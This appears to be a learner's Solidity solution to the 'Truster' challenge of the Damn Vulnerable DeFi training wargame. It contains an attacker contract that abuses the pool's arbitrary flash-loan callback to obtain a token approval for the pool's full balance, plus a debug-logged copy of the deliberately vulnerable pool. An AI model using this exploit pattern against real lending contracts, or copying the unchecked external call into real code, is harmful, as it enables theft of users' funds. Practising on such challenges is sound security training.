// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

import "hardhat/console.sol";

contract TrusterLenderPoolAttacker {
    TrusterLenderPool private pool;
    IERC20 public damnValuableToken;

    constructor(address poolAddress, address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
        pool = TrusterLenderPool(poolAddress);
        console.log('deployed');
    }

    function attack(address attacker) public {
        console.log('attack');
        uint256 poolBalance = damnValuableToken.balanceOf(address(pool));
        console.log("poolBalance", poolBalance);
        console.log('current contract', address(this));
        // function transfer(address _to, uint256 _value) public returns (bool success)
        // function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)
        // function approve(address _spender, uint256 _value) public returns (bool success)
        // pool.flashLoan(
        //     0,
        //     // address borrower,
        //     address(this),
        //     // address target,
        //     address(pool),  // WRONG
        //     // bytes calldata data
        //     abi.encodeWithSignature(
        //         "approve(address, uint256)",
        //         attacker,
        //         poolBalance
        //     )
        //     // ,
        //     // abi.encodeWithSignature(
        //     //     "transfer(address, uint256)",
        //     //     address(this),
        //     //     1
        //     // )
        // );
        pool.flashLoan(
            0, 
            address(this), 
            address(damnValuableToken), 
            abi.encodeWithSignature(
                "approve(address,uint256)", 
                attacker, 
                poolBalance
            )
        );
        // why doesnt work?
        // damnValuableToken.transferFrom(address(pool), attacker, poolBalance);
    }

    // receive () external payable {}
}
/**
 * @title TrusterLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TrusterLenderPool is ReentrancyGuard {

    using Address for address;

    IERC20 public immutable damnValuableToken;

    constructor (address tokenAddress) {
        damnValuableToken = IERC20(tokenAddress);
    }

    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
    )
        external
        nonReentrant
    {
       
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        console.log("balanceBefore", balanceBefore);
        console.log("borrowAmount", borrowAmount);
        require(balanceBefore >= borrowAmount, "Not enough tokens in pool");
        console.log('GOOD1');
        damnValuableToken.transfer(borrower, borrowAmount);
        target.functionCall(data);
        console.log('Good 1.5');

        uint256 balanceAfter = damnValuableToken.balanceOf(address(this));
        require(balanceAfter >= balanceBefore, "Flash loan hasn't been paid back");
        console.log('GOOD2');
    }

}
